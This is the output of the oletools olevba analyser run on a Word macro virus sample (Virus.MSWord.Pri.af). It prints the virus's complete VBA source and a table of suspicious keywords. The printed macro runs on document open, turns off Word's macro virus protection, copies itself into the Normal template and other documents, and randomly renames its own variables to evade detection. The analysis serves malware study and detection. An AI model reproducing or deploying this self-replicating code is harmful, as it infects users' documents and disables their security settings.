olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pri.af-a8c9cda5cd171133b7a5fc8235c706474a97b049
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pri.af-a8c9cda5cd171133b7a5fc8235c706474a97b049 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For x = 1 To 10
ActiveDocument.Shapes.AddShape(msoShapePentagon, Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next x: End If
JI8889 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
EH395 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set OJ5533 = ActiveDocument.VBProject.VBComponents.Item(1)
PS3650 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set OJ5533 = NormalTemplate.VBProject.VBComponents.Item(1)
ES4182 = True
Call EC3244_AF3034
ActiveDocument.Saved = True
End If
If ES4182 <> True And PS3650 <> True Then GoTo SV2292
If ES4182 = True Then OJ5533.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, JI8889 - 1) & vbCr & "Sub ViewVBCode" & vbCr & "End Sub")
If PS3650 = True Then OJ5533.CodeModule.AddFromString ("Private Sub Document_Open" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, EH395 - 3))
SV2292:
If EH395 <> 0 And JI8889 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub 'W97M/PSD ...porn star dreams? [(c)1998 ALT-F11 code hack]
Private Function EC3244_AF3034()
On Error Resume Next
Randomize
Dim r1(1 To 14) As String
r1(1) = "CU336": r1(2) = "SN190": r1(3) = "PE14": r1(4) = "GH9261": r1(5) = "AF3034": r1(6) = "JI8889"
r1(7) = "EH395": r1(8) = "PS3650":: r1(9) = "OJ5533": r1(10) = "ES4182": r1(11) = "SV2292": r1(12) = "EC3244": r1(13) = "KD9156": r1(14) = "NK1762"
For x = 1 To 14
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call AF3034(a1, r1(x))
Next x
End Function 'VAMP v1.0 [thanks Vic!]
Private Function AF3034(NK1762, KD9156 As String)
On Error Resume Next
Dim CU336 As Long: Dim SN190 As Long: Dim PE14 As Long: Dim GH9261 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
CU336 = 1: SN190 = 1: PE14 = .CountOfLines: GH9261 = Len(.Lines(.CountOfLines, 1))
Do While .Find(KD9156, CU336, SN190, PE14, GH9261, True)
strline = .Lines(CU336, 1)
strline = Left(strline, SN190 - 1) & NK1762 & Mid(strline, GH9261)
.replaceline CU336, strline
CU336 = PE14 + 1: SN190 = 1:
PE14 = .CountOfLines
GH9261 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |<Mx                 |PE14                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

